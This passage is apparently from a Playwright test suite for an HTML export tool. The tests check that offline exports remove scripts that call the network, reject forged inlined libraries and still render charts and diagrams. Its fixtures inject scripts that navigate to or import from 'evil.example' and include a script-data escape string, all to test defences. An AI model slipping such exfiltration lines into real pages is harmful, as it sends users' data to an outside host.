    // gate that only knew `https://` would certify exactly what the exporter now removes.
    const smuggles = [
      'location.href = "https://evil.example/steal";',
      'location.href = "https:evil.example/steal";',
    ];
    for (const [i, smuggle] of smuggles.entries()) {
      const smuggledPath = path.join(outDir, "offline-navigation-smuggled-" + i + ".html");
      fs.writeFileSync(smuggledPath, exportedHtml.replace(
        "</body>", "<script>" + smuggle + "</script></body>"));
      let smuggledOut = "";
      try {
        execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", smuggledPath], { cwd: SKILL, stdio: "pipe" });
        throw new Error("the strict validator accepted a smuggled top-level navigation: " + smuggle);
      } catch (e) {
        smuggledOut = String(e.stdout || "") + String(e.stderr || "") + String(e.message || "");
      }
      // Match the specific navigation error, not just any validation failure - otherwise an
      // unrelated breakage would read as this gate working.
      expect(smuggledOut).toMatch(/matches a direct top-level navigation to a network URL/i);
    }

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const link = document.getElementById("docsLink");
      return {
        exfilRan: window.__cmhExfilRan === true,
        openExfilRan: window.__cmhOpenExfilRan === true,
        chainExfilRan: window.__cmhChainExfilRan === true,
        schemeOnlyExfilRan: window.__cmhSchemeOnlyExfilRan === true,
        schemeStringKept: window.__cmhSchemeStringKept,
        benignKept: window.__cmhBenignLocationKept === true,
        localShadowKept: window.__cmhLocalShadowKept,
        localOpenArg: window.__cmhLocalOpenArg,
        shadowedHrefKept: window.__cmhShadowedHrefKept,
        // The anchor itself must survive with its href intact - only the permissive
        // referrerpolicy is taken away, so the export is not just deleting the link.
        linkHref: link && link.getAttribute("href"),
        linkPolicy: link && link.getAttribute("referrerpolicy"),
        docPolicy: (document.querySelector('meta[name="referrer"]') || {}).content,
      };
    });
    expect(state.exfilRan).toBe(false);
    expect(state.openExfilRan).toBe(false);
    expect(state.chainExfilRan).toBe(false);
    expect(state.schemeOnlyExfilRan).toBe(false);
    expect(state.schemeStringKept).toBe("https:");
    expect(state.benignKept).toBe(true);
    expect(state.localShadowKept).toBe("https://api.example.org/v1");
    expect(state.localOpenArg).toBe("https://docs.example.org/guide");
    expect(state.shadowedHrefKept).toBe("https://api.example.org/v1");
    expect(state.linkHref).toBe("https://docs.example.org/guide");
    expect(state.linkPolicy).toBeNull();
    expect(state.docPolicy).toBe("no-referrer");
    expect(page2.url()).toBe(fileUrl(exportedPath));
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("NonShareable export ignores region marker text in content (CMH-FWDCOMPAT-01)", async ({ page }) => {
  const staged = stageNonShareable({
    mutate: (html) => html.replace(
      /(<main\b[^>]*id="commentRoot"[\s\S]*?<!-- BEGIN: commentable-html - CONTENT[^>]*-->)[\s\S]*?(<!-- END: commentable-html - CONTENT -->)/,
      '$1\n<h1>Region marker prose</h1>\n<pre>\nBEGIN: commentable-html - CSS\n</pre>\n$2'
    ),
  });
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnSaveHtmlTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).toMatch(/<pre\b[\s\S]*BEGIN: commentable-html - CSS[\s\S]*<\/pre>/);
    expectForwardCompatibleContract(exportedHtml, "shareable");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The offline export replaces the CDN mermaid loader with its own vendored-inline re-init; that
// re-init must carry the same "render hidden diagrams off-screen with mermaid.render()" logic as the
// live loader, so an offline-exported report with a diagram in a collapsed section renders it
// correctly at load (not as a broken zero-size layout), with zero network (CMH-MMD-07).
test("CMH-MMD-07: Export Offline renders a collapsed-section diagram correctly at load with zero network", async ({ page, browser }) => {
  test.setTimeout(60000);
  const CONTENT_COLLAPSED = `
<section><h2>Intro</h2><p id="intro-note">lead-in prose so the content column is wide.</p></section>
<section class="cmh-section-collapsed" id="sec-diagram"><h2>Narrative arc</h2>
<pre class="mermaid cm-skip">flowchart LR
  A["Act 1<br/>The Gap"] --> B["Act 2<br/>Flagship"] --> C["Act 3<br/>Tour"] --> D["Act 4<br/>Dev"] --> E["Act 5<br/>Hood"] --> F["Act 6<br/>Close"]
</pre></section>`;
  const staged = stageContent(CONTENT_COLLAPSED, { key: "cmh-offline-collapsed-mmd", source: "offline-collapsed.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.setViewportSize({ width: 1600, height: 900 });
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");

    const exportedPath = path.join(outDir, "offline-collapsed.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => { if (/^https?:\/\//.test(request.url())) external.push(request.url()); });
    await page2.setViewportSize({ width: 1600, height: 900 });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    // The diagram is rendered off-screen at load even though its section stays collapsed, with zero
    // network - so its nodes exist and are correctly laid out without any reveal.
    await expect
      .poll(() => page2.locator("#sec-diagram pre.mermaid svg g.node").count(), { timeout: 20000 })
      .toBe(6);
    const viewBoxWidth = await page2.evaluate(() => {
      const svg = document.querySelector("#sec-diagram pre.mermaid svg");
      const vb = (svg.getAttribute("viewBox") || "").split(/\s+/).map(Number);
      return vb.length === 4 ? vb[2] : 0;
    });
    expect(viewBoxWidth).toBeGreaterThan(400);
    expect(external).toEqual([]);
  } finally {
    await server.close();
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The exporter's chart-canvas selector is deliberately a SUPERSET of what any one renderer draws, so
// the SHAPE of a canvas is not evidence that Chart.js is needed: a canvas carrying
// data-cmh-chart-points / data-cmh-chart-source is drawn by the runtime's own 2D renderer
// (renderInteractiveChart) and never calls Chart.js. Inlining the library for such a document ships
// ~1 MB of dead weight in every offline export (CMH-OFFLINE-06).
const BUILTIN_CHART_CONTENT = `
<h1>Built-in chart</h1>
<p id="builtin-chart-note">This chart is drawn by the built-in renderer, not by Chart.js.</p>
<figure class="chart" aria-labelledby="builtin-chart-cap">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px; max-height: 180px; overflow: hidden;">
    <canvas id="builtinChart" class="cmh-chart" width="360" height="180" role="img" aria-label="Built-in bar chart"
      data-cmh-chart-points='[{"label":"one","value":4},{"label":"two","value":9},{"label":"three","value":6}]'></canvas>
  </div>
  <figcaption id="builtin-chart-cap">Built-in canvas chart.</figcaption>
</figure>`;

test("CMH-OFFLINE-06: Export Offline omits Chart.js for a document only the built-in renderer draws", async ({ page, browser }) => {
  test.setTimeout(60000);
  const staged = stageContent(BUILTIN_CHART_CONTENT, { key: "cmh-offline-builtin-chart", source: "offline-builtin-chart.html" });
  // Seed a library this exporter inlined on an earlier pass, as a re-export of an older offline file
  // carries. It must be removed by its marker (and must not count as evidence that the document
  // needs the library), so the export neither keeps it nor grows a second copy.
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(
    "</head>",
    '<script data-cmh-offline-lib="chartjs">window.__staleInlinedLib = true; /* new Chart( */</script>\n</head>'));
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    // The live document draws the chart with the built-in renderer and never defines Chart.
    expect(await page.evaluate(() => typeof window.Chart)).toBe("undefined");
    expect(await page.evaluate(() => {
      const c = document.getElementById("builtinChart");
      return c && c._cmhChart ? c._cmhChart.points.length : 0;
    })).toBe(3);

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // No library, and no MIT notice for a library that is not there.
    expect(exportedHtml).not.toContain('data-cmh-offline-lib="chartjs"');
    expect(exportedHtml).not.toContain("__staleInlinedLib");
    expect(exportedHtml).not.toContain("Third-party notice - Chart.js");
    expect(exportedHtml).not.toContain('data-cmh-offline-lib="mermaid"');
    expect(exportedHtml).not.toContain('id="cmhVendoredRichLibs"');
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-builtin-chart.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    // Never provision less than the renderer draws: the chart still renders, with zero network.
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const c = document.getElementById("builtinChart");
      return { hasChart: typeof window.Chart !== "undefined", points: c && c._cmhChart ? c._cmhChart.points.length : 0 };
    });
    expect(state.hasChart).toBe(false);
    expect(state.points).toBe(3);
    expect(external).toEqual([]);

    // Re-exporting the offline file stays library-free and does not accumulate a second copy.
    await installDownloadTextCapture(page2);
    await page2.reload();
    await ready(page2);
    await openToolbarMenu(page2);
    await Promise.all([
      page2.waitForEvent("download"),
      page2.locator("#btnExportOfflineTop").click(),
    ]);
    const reExported = await capturedDownloadText(page2);
    expect(reExported).not.toContain('data-cmh-offline-lib="chartjs"');
    expect(reExported).not.toContain("Third-party notice - Chart.js");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-06: Export Offline still inlines Chart.js when the document constructs a Chart on a built-in canvas", async ({ page, browser }) => {
  // The superset selector is load-bearing: an author may attach their own Chart.js to ANY canvas,
  // including one that also carries the built-in data attributes. Evidence that the document uses
  // the library must win over the "the built-in renderer draws it" shortcut, or the export would
  // drop a library its own chart needs. The second case pins the INDIRECT construction that a
  // literal `new Chart(` detector would miss.
  test.setTimeout(90000);
  const cases = [
    {
      key: "direct",
      script: `
(function () {
  var el = document.getElementById("builtinChart");
  if (!el || typeof Chart === "undefined") return;
  window.__authorChartBuilt = true;
  new Chart(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
})();`,
    },
    {
      key: "aliased",
      script: `
// Chart bundle: chart.umd.min.js
(function () {
  var el = document.getElementById("builtinChart");
  var C = window.Chart;
  if (!el || !C) return;
  window.__authorChartBuilt = true;
  var chart = new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
  return chart;
})();`,
    },
    {
      key: "module",
      type: ' type="module"',
      script: `
const el = document.getElementById("builtinChart");
const C = window.Chart;
if (el && C) {
  window.__authorChartBuilt = true;
  new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
}`,
    },
  ];
  for (const variant of cases) {
    const content = BUILTIN_CHART_CONTENT
      + '\n<script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.js"></script>\n<script'
      + (variant.type || "") + ">" + variant.script + "\n</script>";
    const staged = stageContent(content, { key: "cmh-offline-author-chart-" + variant.key, source: "offline-author-chart.html" });
    const outDir = makeTmpDir();
    let ctx2;
    try {
      await routeRichContentLocal(page);
      await installDownloadTextCapture(page);
      await page.goto(fileUrl(staged.html));
      await ready(page);
      // A module script is deferred, so wait for the author chart rather than sampling once.
      await page.waitForFunction(() => window.__authorChartBuilt === true);

      await openToolbarMenu(page);
      await Promise.all([
        page.waitForEvent("download"),
        page.locator("#btnExportOfflineTop").click(),
      ]);
      const exportedHtml = await capturedDownloadText(page);
      expect(exportedHtml, `${variant.key}: Chart.js inlined`).toContain('data-cmh-offline-lib="chartjs"');
      expect(exportedHtml, `${variant.key}: MIT notice travels with it`).toContain("Third-party notice - Chart.js");
      expect(networkLoadRefs(exportedHtml)).toEqual([]);

      // The library must be inlined BEFORE the constructing script runs, so prove it by reopening
      // the export offline rather than by asserting the marker alone.
      const exportedPath = path.join(outDir, "offline-author-chart.html");
      fs.writeFileSync(exportedPath, exportedHtml);
      ctx2 = await browser.newContext();
      const page2 = await ctx2.newPage();
      const external = [];
      await page2.route(/^https?:\/\//, async (route) => {
        external.push(route.request().url());
        await route.abort();
      });
      // addInitScript only applies to navigations that follow it, so install before the goto.
      await installDownloadTextCapture(page2);
      await page2.goto(fileUrl(exportedPath));
      await ready(page2);
      await page2.waitForFunction(() => window.__authorChartBuilt === true);
      expect(await page2.evaluate(() => typeof window.Chart !== "undefined"),
        `${variant.key}: Chart global present offline`).toBe(true);
      expect(external).toEqual([]);
    } finally {
      if (ctx2) await ctx2.close();
      fs.rmSync(staged.dir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-06: evidence covers a head-placed legacy-typed constructor and unusable built-in data", async ({ page, browser }) => {
  // Two branches that a shape-only or literal-constructor detector would miss: a constructing script
  // in the HEAD (which must be hoisted below the inlined library or it runs first) declared with a
  // legacy but still-executable script type, and a canvas whose built-in data cannot draw anything,
  // so the built-in renderer is NOT what covers it.
  test.setTimeout(90000);
  const outDir = makeTmpDir();
  const stagedHead = stageContent(BUILTIN_CHART_CONTENT, { key: "cmh-offline-head-ctor", source: "offline-head-ctor.html" });
  const emptyData = BUILTIN_CHART_CONTENT.replace(/data-cmh-chart-points='[^']*'/, "data-cmh-chart-points=''");
  const stagedEmpty = stageContent(emptyData, { key: "cmh-offline-empty-data", source: "offline-empty-data.html" });
  let ctx2;
  try {
    expect(emptyData).toContain("data-cmh-chart-points=''");
    fs.writeFileSync(stagedHead.html, fs.readFileSync(stagedHead.html, "utf8").replace(
      "</head>",
      '<script type="text/ecmascript">\nwindow.addEventListener("DOMContentLoaded", function () {\n'
      + '  var el = document.getElementById("builtinChart");\n  var C = window.Chart;\n'
      + '  if (!el || !C) return;\n  window.__headChartBuilt = true;\n'
      + '  new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ data: [4] }] }, options: { animation: false, responsive: false } });\n'
      + "});\n</script>\n</head>"));

    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(stagedHead.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const headExport = await capturedDownloadText(page);
    expect(headExport, "a legacy-typed head constructor is evidence").toContain('data-cmh-offline-lib="chartjs"');
    const exportedPath = path.join(outDir, "offline-head-ctor.html");
    fs.writeFileSync(exportedPath, headExport);
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await page2.waitForFunction(() => window.__headChartBuilt === true);
    expect(external).toEqual([]);

    // A canvas whose inline data cannot produce a point is not one the built-in renderer draws, so
    // the library still travels rather than leaving the canvas blank.
    await page.goto(fileUrl(stagedEmpty.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(await capturedDownloadText(page), "unusable built-in data still provisions the library")
      .toContain('data-cmh-offline-lib="chartjs"');
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(stagedHead.dir, { recursive: true, force: true });
    fs.rmSync(stagedEmpty.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline fails loudly when a rich document has no vendored payload (CMH-SIZE-01)", async ({ page }) => {
  // The payload is now stripped from documents that do not use rich content (CMH-SIZE-01). The
  // hazard that creates is the OTHER direction: a document that DOES use mermaid or a chart but
  // whose payload is absent - a hand-edited or legacy file. It must fail visibly rather than
  // silently downloading an export whose diagrams and charts will never render.
  test.setTimeout(60000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-nopayload", source: "offline-nopayload.html" });
  const before = fs.readFileSync(staged.html, "utf8");
  // Cut the payload out by INDEX rather than with a replace() pattern. This is a test fixture
  // removing one known element, not a sanitizer, and a regex here reads to CodeQL as an
  // incomplete multi-character sanitization.
  const idAt = before.indexOf('id="cmhVendoredRichLibs"');
  expect(idAt).toBeGreaterThan(-1);
  const openAt = before.lastIndexOf("<script", idAt);
  const closeAt = before.indexOf("</script>", idAt);
  expect(openAt).toBeGreaterThan(-1);
  expect(closeAt).toBeGreaterThan(openAt);
  const stripped = before.slice(0, openAt) + before.slice(closeAt + "</script>".length);
  expect(stripped.length).toBeLessThan(before.length - 1000000);
  expect(stripped).not.toContain('id="cmhVendoredRichLibs">{"encoding"');
  fs.writeFileSync(staged.html, stripped);

  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);

    // Use the TOOLBAR export entry: the sidebar menu only appears once a comment exists, and
    // this document needs no comments to reproduce the failure.
    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    const downloads = [];
    page.on("download", (d) => downloads.push(d));
    await page.locator("#btnExportOfflineTop").click();

    // A visible, assertive error naming the missing bundle - not a silent broken download.
    const toast = page.locator("#toast");
    await expect(toast).toContainText(/missing the vendored/i, { timeout: 15000 });
    await expect(toast).toBeVisible();
    expect(downloads).toHaveLength(0);
  } finally {
    await server.close();
  }
});

test("CMH-OFFLINE-07: re-exporting an already-offline document reuses its inlined libraries", async ({ page, browser }) => {
  test.setTimeout(120000);
  // An Offline export removes the vendored payload it consumed, so the file it produces carries the
  // libraries inline and no payload at all. Re-exporting THAT file must reuse the copies already in
  // it rather than demanding a payload that no longer exists.
  const staged = stageContent(CONTENT, { key: "cmh-offline-reexport", source: "offline-reexport.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  let ctx3;
  try {
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const onceHtml = await capturedDownloadText(page);
    expect(onceHtml).toContain('data-cmh-offline-lib="mermaid"');
    expect(onceHtml).toContain('data-cmh-offline-lib="chartjs"');
    expect(onceHtml).not.toContain('id="cmhVendoredRichLibs"');
    const oncePath = path.join(outDir, "offline-once.html");
    fs.writeFileSync(oncePath, onceHtml);

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external2 = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external2.push(route.request().url());
      await route.abort();
    });
    await installDownloadTextCapture(page2);
    await page2.goto(fileUrl(oncePath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");

    await openToolbarMenu(page2);
    // The download event IS the assertion that the export did not fail: on the old code the export
    // threw and showed an error toast, so no download ever arrived and this timed out.
    await Promise.all([
      page2.waitForEvent("download"),
      page2.locator("#btnExportOfflineTop").click(),
    ]);
    const twiceHtml = await capturedDownloadText(page2);

    // Exactly one copy of each library, its init shim, and each MIT notice - a re-export reuses what
    // is already there and never accumulates a second megabyte.
    expect((twiceHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((twiceHtml.match(/data-cmh-offline-lib="chartjs"/g) || []).length).toBe(1);
    expect((twiceHtml.match(/data-cmh-offline-lib-init="mermaid"/g) || []).length).toBe(1);
    expect((twiceHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((twiceHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    const notices = [...twiceHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
    expect(notices.find((c) => c.includes("Third-party notice - mermaid"))).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(notices.find((c) => c.includes("Third-party notice - Chart.js"))).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(networkLoadRefs(twiceHtml)).toEqual([]);
    expect(twiceHtml).not.toContain('id="cmhVendoredRichLibs"');
    expect(external2).toEqual([]);

    const twicePath = path.join(outDir, "offline-twice.html");
    fs.writeFileSync(twicePath, twiceHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", twicePath], { cwd: SKILL, stdio: "pipe" });

    // The twice-exported file still renders its diagram and its chart with zero network.
    ctx3 = await browser.newContext();
    const page3 = await ctx3.newPage();
    const external3 = [];
    await page3.route(/^https?:\/\//, async (route) => {
      external3.push(route.request().url());
      await route.abort();
    });
    await page3.goto(fileUrl(twicePath));
    await ready(page3);
    await expect(page3.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
    expect(await page3.evaluate(() => {
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      return chart && chart.data && chart.data.datasets ? chart.data.datasets.length : 0;
    })).toBe(1);
    expect(external3).toEqual([]);
  } finally {
    if (ctx3) await ctx3.close();
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});
// Every type the HTML spec calls a JavaScript MIME type - a browser executes all of them, so both
// offline strips must treat all of them as code. Written out literally (not derived from the
// runtime) so a type dropped from the predicate loses its coverage here too.
const RUNNABLE_SCRIPT_TYPES = [
  "text/javascript", "application/javascript",
  "text/x-javascript", "application/x-javascript",
  "text/ecmascript", "application/ecmascript",
  "text/x-ecmascript", "application/x-ecmascript",
  "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
  "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
  "text/jscript", "text/livescript",
];
// Genuinely non-executable: data or transpiler-only. Widening the predicate must not start
// deleting these - they are content, not code.
const INERT_SCRIPT_TYPES = ["text/template", "application/json", "text/x-handlebars-template"];

function typeSlug(type) {
  return type.replace(/[^a-z0-9]+/gi, "-");
}

// Built by concatenation rather than nested template literals: a template literal interpolating
// another one confuses the spec-reference checker's title scanner, which then cannot see the test
// titles defined after it.
function scriptBlock(type, marker, importTarget) {
  return '<script type="' + type + '">\n'
    + "/* " + marker + " */\n"
    + 'import("https://evil.example/' + importTarget + '").catch(function () {});\n'
    + "</script>";
}

const LEGACY_TYPE_CONTENT = [
  "<h1>Legacy script MIME types</h1>",
  '<p id="legacy-note">A legacy executable script type still runs in a browser.</p>',
].concat(
  RUNNABLE_SCRIPT_TYPES.map((t) => scriptBlock(t, "cmh-runnable-" + typeSlug(t), "egress-" + typeSlug(t) + ".js")),
  [
    '<script type="application/x-javascript">',
    "/* cmh-legacy-mermaid-loader */",
    'if (window.mermaid) window.mermaid.run({ querySelector: "pre.mermaid" });',
    "</script>",
    '<script type="text/livescript">',
    "/* cmh-legacy-chart-loader pulls chart.umd.js */",
    "</script>",
  ],
  INERT_SCRIPT_TYPES.map((t) => scriptBlock(t, "cmh-inert-" + typeSlug(t), "inert-" + typeSlug(t) + ".js"))
).join("\n");
test("CMH-OFFLINE-04: the offline strips cover every executable script MIME type, not only the modern three", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(LEGACY_TYPE_CONTENT, { key: "cmh-offline-legacy-types", source: "offline-legacy-types.html" });
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // A legacy JavaScript MIME type executes exactly like `text/javascript`, so the network strip
    // must reach EVERY one of them and remove its remote dynamic import.
    for (const type of RUNNABLE_SCRIPT_TYPES) {
      expect(exportedHtml, `runnable type ${type} must be stripped`).not.toContain(`cmh-runnable-${typeSlug(type)}`);
      expect(exportedHtml, `runnable type ${type} egress target`).not.toContain(`egress-${typeSlug(type)}.js`);
    }
    // The renderer strip must reach them too: a stale mermaid or chart loader shim carrying a
    // legacy type is just as dead as one carrying a modern type.
    expect(exportedHtml, "application/x-javascript mermaid loader").not.toContain("cmh-legacy-mermaid-loader");
    expect(exportedHtml, "text/livescript chart loader").not.toContain("cmh-legacy-chart-loader");

    // ...and no further: a genuinely non-executable script block carrying the same import text is
    // data, not code, so widening the predicate must not start deleting it.
    for (const type of INERT_SCRIPT_TYPES) {
      expect(exportedHtml, `inert type ${type} is data, not code`).toContain(`cmh-inert-${typeSlug(type)}`);
      expect(exportedHtml, `inert type ${type} keeps its text`).toContain(`inert-${typeSlug(type)}.js`);
    }
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

const FORGERY_CONTENT = `
<h1>Forged inlined-library marker</h1>
<p id="forge-note">This document needs mermaid, so the export must resolve a library for it.</p>
<pre class="mermaid cm-skip">
flowchart LR
  A[Alpha] --> B[Beta]
</pre>`;

const FORGED_NOTICE = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nFORGED LICENSE TEXT\n-->";

// Cut the vendored payload out by INDEX (not a replace() pattern): this is a fixture removing one
// known element, not a sanitizer, and a regex here reads to CodeQL as incomplete sanitization.
function withoutVendoredPayload(html) {
  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
  if (idAt < 0) throw new Error("fixture has no vendored payload to remove");
  const openAt = html.lastIndexOf("<script", idAt);
  const closeAt = html.indexOf("</script>", idAt);
  if (openAt < 0 || closeAt < openAt) throw new Error("could not bound the vendored payload");
  return html.slice(0, openAt) + html.slice(closeAt + "</script>".length);
}

test("CMH-OFFLINE-07: a forged inlined-library marker is never re-emitted as executable code", async ({ page }) => {
  test.setTimeout(180000);
  // Re-emitting a captured library GRANTS IT EXECUTION in the exported file, and the document being
  // exported is untrusted, so the `data-cmh-offline-lib` marker alone must never be taken as proof
  // this exporter wrote it. Each forgery below defeats exactly ONE provenance gate, so the export
  // falls through to the same loud failure a payload-less rich document has always produced
  // (CMH-SIZE-01) instead of promoting the forged bytes into a running script. Every case keeps the
  // OTHER gates satisfied, so each one is discriminating on its own gate. The trailing LICENSING
  // case is not a gate: its copy passes all four, so it fails with its own specific message
  // (`toast`) naming the missing notice and the action, not the generic missing-bundle one.
  const forgeries = [
    {
      name: "gate 1: a marker outside the head is not captured",
      // The notice sits immediately before the script, in the body, so ONLY the location gate
      // rejects this one.
      head: "",
      body: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-body */ window.__forged = 1;</script>',
    },
    {
      name: "gate 2: inert type is not promoted to code",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" type="application/json">"cmh-forged-inert"</script>',
      body: "",
    },
    {
      name: "gate 2: a MIME-parameter type does not execute, so it is not promoted",
      // HTML matches a script type by ESSENCE, so `text/javascript;charset=utf-8` never runs.
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" type="text/javascript;charset=utf-8">/* cmh-forged-param */ window.__forged = 2;</script>',
      body: "",
    },
    {
      name: "gate 2: a nomodule body never ran in any module-supporting browser",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" nomodule>/* cmh-forged-nomodule */ window.__forged = 3;</script>',
      body: "",
    },
    {
      name: "gate 2: the inline text of a src-bearing marker never ran",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" src="mermaid.min.js">/* cmh-forged-src */ window.__forged = 4;</script>',
      body: "",
    },
    {
      name: "gate 3: captured code cannot smuggle egress past the strips",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-egress */ import("https://evil.example/forged-egress.js").catch(function () {});</script>',
      body: "",
    },
    {
      name: "gate 4: bytes that open a script-data escape are not re-emitted",
      // `<!--` then `<script` puts a re-parse into the script-data-double-escaped state, where the
      // emitted `</script>` no longer closes the element and the rest of the head is swallowed.
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-escape */ var s = "<!--<script>x<\\/script>";</script>',
      body: "",
    },
    {
      name: "licensing: a library with no MIT notice beside it is not redistributed",
      head: '<script data-cmh-offline-lib="mermaid">/* cmh-forged-unlicensed */ window.__forged = 5;</script>',
      body: "",
      // The bundle is right there in the file, so the generic missing-bundle message would be
      // misleading: only the licence blocks the re-emission, and the fix is a different action.
      toast: /inlined mermaid library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
      // The long actionable message must outlive the 3s confirmation-toast default, or the sentence
      // that says what to do is gone before it can be read.
      stillShownAfterMs: 5000,
    },
    {
